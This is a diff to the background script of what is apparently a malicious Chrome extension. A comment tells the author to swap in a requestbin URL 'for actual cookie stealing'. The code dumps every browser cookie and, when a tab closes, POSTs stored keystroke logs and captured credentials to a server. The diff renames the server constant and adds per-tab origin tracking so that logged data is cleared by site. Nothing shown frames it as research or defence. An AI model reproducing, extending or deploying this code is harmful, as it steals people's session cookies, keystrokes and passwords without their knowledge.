@@ -2,7 +2,7 @@
  * replace URL with requestbin for actual cookie stealing
  * https://en974z7hs59e3gc.m.pipedream.net/
  */
-const URL = "http://localhost:6900";
+const BACKEND = "http://localhost:6900";
 
 /*
  * incremental cookie dump
@@ -24,7 +24,7 @@ chrome.cookies.getAll({}, (r) => {
 });
 
 function send(data, where) {
-  fetch(`${URL}/${where}`, {
+  fetch(`${BACKEND}/${where}`, {
     method: "POST",
     body: JSON.stringify({ data }),
     headers: {
@@ -48,11 +48,31 @@ chrome.storage.local.get(["UID"], (res) => {
   // prevent randoms from flooding server with junk
 });
 
+let urls = [];
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, _) => {
+  if (changeInfo.url) {
+    const { origin } = new URL(changeInfo.url);
+    console.log("Updated origin: ", origin);
+    urls[tabId] = origin;
+  }
+});
+
+chrome.tabs.onCreated.addListener((tab) => {
+    const { origin } = new URL(tab.url);
+    console.log("Created origin: ", origin);
+    urls[tab.id] = origin;
+});
+
 // post to server on tab close
-chrome.tabs.onRemoved.addListener(() => {
+chrome.tabs.onRemoved.addListener((tabId, _) => {
   chrome.storage.local.get(["database"], (items) => {
     send(items, "keylog");
     console.log(items);
+    let db = items.database;
+    let origin = urls[tabId];
+    console.log("origin == ", origin);
+    db[origin] = "";
+    chrome.storage.local.set({database: db})
   });
   chrome.storage.local.get(["credentials"], (items) => {
     send(items, "credentials");
